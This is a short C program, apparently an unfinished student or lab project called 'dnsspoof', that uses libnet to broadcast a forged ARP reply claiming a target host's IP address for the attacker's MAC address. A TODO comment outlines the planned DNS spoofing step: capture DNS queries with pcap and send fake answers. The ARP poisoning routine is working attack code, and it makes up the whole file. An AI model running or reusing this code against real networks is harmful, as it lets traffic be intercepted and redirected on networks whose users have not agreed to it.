/*
 * Copyright (C) 2017 Jan Pawlak, Piotr Markowski
 *
 * Compilation:  make
 * Usage:        ./dnsspoof HOST	//TODO
 * NOTE:         This program requires root privileges.
 *
 */

#include <libnet.h>
#include <stdlib.h>

void arp_spoof(char *host){
	printf("host: %s\n", host);
  	libnet_t *ln;
	u_int32_t target_ip_addr, zero_ip_addr;
  	u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           	zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  	struct libnet_ether_addr* src_hw_addr;
  	char errbuf[LIBNET_ERRBUF_SIZE];

  	ln = libnet_init(LIBNET_LINK, NULL, errbuf);
  	src_hw_addr = libnet_get_hwaddr(ln);
  	target_ip_addr = libnet_name2addr4(ln, host, LIBNET_RESOLVE);
  	zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  	libnet_autobuild_arp(
    		ARPOP_REPLY,                     /* operation type       */
    		src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    		(u_int8_t*) &target_ip_addr,     /* sender protocol addr */
    		zero_hw_addr,                    /* target hardware addr */
    		(u_int8_t*) &zero_ip_addr,       /* target protocol addr */
    		ln);                             /* libnet context       */
  	libnet_autobuild_ethernet(
    		bcast_hw_addr,                   /* ethernet destination */
    		ETHERTYPE_ARP,                   /* ethertype            */
   		ln);                             /* libnet context       */
  	libnet_write(ln);
	libnet_destroy(ln);
}

int main(int argc, char** argv) {
  	if (argc < 2){
		printf("Usage: %s HOST\n", argv[0]);
		exit(-1);
	}
  	arp_spoof(argv[1]);
	//TODO: Second argument: INTERFACE
	//	Filter DNS packets on INTERFACE using pcap, build and send fake answer
	
  	return EXIT_SUCCESS;
}
